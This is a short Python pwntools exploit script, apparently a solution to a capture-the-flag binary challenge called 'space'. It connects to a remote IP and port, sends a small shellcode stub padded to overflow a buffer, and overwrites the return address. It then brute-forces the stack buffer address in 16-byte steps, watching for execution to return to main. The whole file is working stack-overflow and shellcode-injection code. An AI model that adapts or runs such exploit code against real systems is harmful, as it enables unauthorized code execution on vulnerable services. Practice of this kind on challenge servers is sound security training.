from pwn import *
import os

BINARY = './space'

BUFF = 0xfffff000
# BUFF = 0xffffd1c1
# 0xffffe000

context.log_level = 'error'

elf = ELF(BINARY, checksec=False) # Extract data from binary
MAIN_PLT = elf.symbols['main']

print("Main @ PLT : " + hex(MAIN_PLT))

while BUFF <= 0xffffffff:

	# p = process(BINARY)
	p = remote('139.59.169.46', 31654)

	shell = b'\x68' + p32(MAIN_PLT) + b'\xc3'

	p.recvuntil('>')
	p.sendline(shell.ljust(18) + p32(BUFF))
	# p.sendline(shell.ljust(18) + p32(MAIN_PLT))

	print(hex(BUFF))


	try:
		if '>' in str(p.recvuntil('>')):
			print("BUFF @ "+ hex(BUFF))
			exit()
	except Exception as e:
		print(e)

	BUFF += 0x10

	p.close()